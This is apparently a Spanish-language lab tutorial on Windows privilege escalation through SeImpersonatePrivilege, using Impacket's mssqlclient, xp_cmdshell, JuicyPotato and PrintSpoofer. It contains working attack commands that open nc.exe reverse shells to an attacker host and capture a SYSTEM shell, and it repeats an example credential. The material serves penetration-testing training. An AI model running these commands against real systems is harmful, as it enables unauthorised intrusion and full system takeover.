In Windows, cada proceso tiene un token que contiene información sobre la cuenta que lo está ejecutando. Estos tokens no se consideran recursos seguros, ya que son solo ubicaciones dentro de la memoria que podrían ser forzadas por usuarios que no pueden leer la memoria. Para utilizar el token, se necesita el privilegio `SeImpersonate`. Este privilegio solo se otorga a cuentas administrativas y, en la mayoría de los casos, puede ser eliminado durante el hardening del sistema. Un ejemplo de uso de este token sería [CreateProcessWithTokenW](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw).

Programas legítimos pueden utilizar el token de otro proceso para escalar de Administrador a Local System, que tiene privilegios adicionales. Los procesos generalmente hacen esto llamando al proceso WinLogon para obtener un token SYSTEM, luego ejecutándose con ese token colocándose dentro del espacio SYSTEM. Los atacantes a menudo abusan de este privilegio en los privescs estilo "Potato" - donde una cuenta de servicio puede `SeImpersonate`, pero no obtener privilegios de nivel SYSTEM completo. Esencialmente, el ataque Potato engaña a un proceso que se ejecuta como SYSTEM para que se conecte a su proceso, entregando el token para ser utilizado.

A menudo nos encontramos con este privilegio después de obtener ejecución de código remoto a través de una aplicación que se ejecuta en el contexto de una cuenta de servicio (por ejemplo, subiendo una web shell a una aplicación web ASP.NET, logrando ejecución de código remoto a través de una instalación de Jenkins o ejecutando comandos a través de consultas MSSQL). Siempre que obtengamos acceso de esta manera, debemos verificar de inmediato este privilegio, ya que su presencia a menudo ofrece una ruta rápida y fácil a privilegios elevados. Este [documento](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt) vale la pena leer para más detalles sobre los ataques de suplantación de tokens.

---

## SeImpersonate Example - JuicyPotato

Tomemos el ejemplo a continuación, donde hemos obtenido acceso a un servidor SQL utilizando un usuario SQL privilegiado. Las conexiones de clientes a IIS y SQL Server pueden estar configuradas para usar Windows Authentication. El servidor puede necesitar acceder a otros recursos como comparticiones de archivos en el contexto del cliente que se conecta. Esto se puede hacer suplantando al usuario cuyo contexto se establece la conexión del cliente. Para hacerlo, se le otorgará a la cuenta de servicio el privilegio [Impersonate a client after authentication](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/impersonate-a-client-after-authentication).

En este escenario, la cuenta de servicio de SQL Server se ejecuta en el contexto de la cuenta predeterminada `mssqlserver`. Imagina que hemos logrado la ejecución de comandos como este usuario utilizando `xp_cmdshell` con un conjunto de credenciales obtenidas en un archivo `logins.sql` en una compartición de archivos usando la herramienta `Snaffler`.

### Connecting with MSSQLClient.py

Usando las credenciales `sql_dev:Str0ng_P@ssw0rd!`, primero conectémonos a la instancia del servidor SQL y confirmemos nuestros privilegios. Podemos hacer esto usando [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py) del toolkit `Impacket`.

```r
mssqlclient.py sql_dev@10.129.43.30 -windows-auth

Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 1: Changed database context to 'master'.
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (130 19162) 
[!] Press help for extra shell commands
SQL>
```

### Enabling xp_cmdshell

A continuación, debemos habilitar el procedimiento almacenado `xp_cmdshell` para ejecutar comandos del sistema operativo. Podemos hacerlo a través del shell MSSQL de Impacket escribiendo `enable_xp_cmdshell`. Escribir `help` muestra algunas otras opciones de comando.

```r
SQL> enable_xp_cmdshell

[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install
```

Nota: No necesitamos escribir `RECONFIGURE` ya que Impacket lo hace por nosotros.

### Confirming Access

Con este acceso, podemos confirmar que estamos ejecutando en el contexto de una cuenta de servicio de SQL Server.

```r
SQL> xp_cmdshell whoami

output                                                                             

--------------------------------------------------------------------------------   

nt service\mssql$sqlexpress01
```

### Checking Account Privileges

A continuación, verifiquemos qué privilegios se han otorgado a la cuenta de servicio.

```r
SQL> xp_cmdshell whoami /priv

output                                                                             

--------------------------------------------------------------------------------   
                                                                    
PRIVILEGES INFORMATION                                                             

----------------------                                                             
Privilege Name                Description                               State      

============================= ========================================= ========   

SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    
SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
SeCreateGlobalPrivilege       Create global objects                     Enabled    
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   
```

El comando `whoami /priv` confirma que [SeImpersonatePrivilege](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege) está listado. Este privilegio se puede usar para suplantar una cuenta privilegiada como `NT AUTHORITY\SYSTEM`. [JuicyPotato](https://github.com/ohpe/juicy-potato) se puede usar para explotar los privilegios `SeImpersonate` o `SeAssignPrimaryToken` a través del abuso de DCOM/NTLM reflection.

### Escalating Privileges Using JuicyPotato

Para escalar privilegios usando estos derechos, primero descarguemos el binario `JuicyPotato.exe` y subamos esto y `nc.exe` al servidor de destino. A continuación, configuremos un listener de Netcat en el puerto 8443 y ejecutemos el comando a continuación donde `-l` es el puerto de escucha del servidor COM, `-p` es el programa a lanzar (cmd.exe), `-a` es el argumento pasado a cmd.exe, y `-t` es la llamada `createprocess`. A continuación, le estamos diciendo a la herramienta que intente ambas funciones [CreateProcessWithTokenW](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw) y [CreateProcessAsUser](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasusera), que necesitan privilegios `SeImpersonate` o `SeAssignPrimaryToken` respectivamente.

```r
SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *

output                                                                             

--------------------------------------------------------------------------------   

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 53375                               
                                                                            
[+] authresult 0                                                                   
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM                                                                                                    
[+] CreateProcessWithTokenW OK                                                     
[+] calling 0x000000000088ce08
```

### Catching SYSTEM Shell

Esto se completa con éxito y se recibe un shell como `NT AUTHORITY\SYSTEM`.

```r
sudo nc -lnvp 8443

listening on [any] 8443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 50332
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.


C:\Windows\system32>whoami

whoami
nt authority\system


C:\Windows\system32>hostname

hostname
WINLPE-SRV01
```

---

## PrintSpoofer and RoguePotato

JuicyPotato no funciona en Windows Server 2019 y Windows 10 build 1809 en adelante. Sin embargo, [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) y [RoguePotato](https://github.com/antonioCoco/RoguePotato) se pueden usar para aprovechar los mismos privilegios y obtener acceso de nivel `NT AUTHORITY\SYSTEM`. Esta [entrada de blog](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) profundiza en la herramienta `PrintSpoofer`, que se puede usar para abusar de los privilegios de suplantación en hosts Windows 10 y Server 2019 donde JuicyPotato ya no funciona.

### Escalating Privileges using PrintSpoofer

Probemos esto usando la herramienta `PrintSpoofer`. Podemos usar la herramienta para generar un proceso SYSTEM en tu consola actual e interactuar con él, generar un proceso SYSTEM en un escritorio (si estás conectado localmente o a través de RDP), o capturar un shell inverso - que haremos en nuestro ejemplo. Nuevamente, conéctate con `mssqlclient.py` y usa la herramienta con el argumento `-c` para ejecutar un comando. Aquí, usando `nc.exe` para generar un shell inverso (con un listener de Netcat esperando en nuestra máquina de ataque en el puerto 8443).

```r
SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"

output                                                                             

--------------------------------------------------------------------------------   

[+] Found privilege: SeImpersonatePrivilege                                        

[+] Named pipe listening...                                                        

[+] CreateProcessAsUser() OK                                                       

NULL 
```

### Catching Reverse Shell as SYSTEM

Si todo va según lo planeado, tendremos un shell SYSTEM en nuestro listener de netcat.

```r
nc -lnvp 8443

listening on [any] 8443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 49847
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.


C:\Windows\system32>whoami

whoami
nt authority\system
```

Escalar privilegios aprovechando `SeImpersonate` es muy común. Es esencial estar familiarizado con los diversos métodos disponibles según la versión y el nivel del sistema operativo objetivo.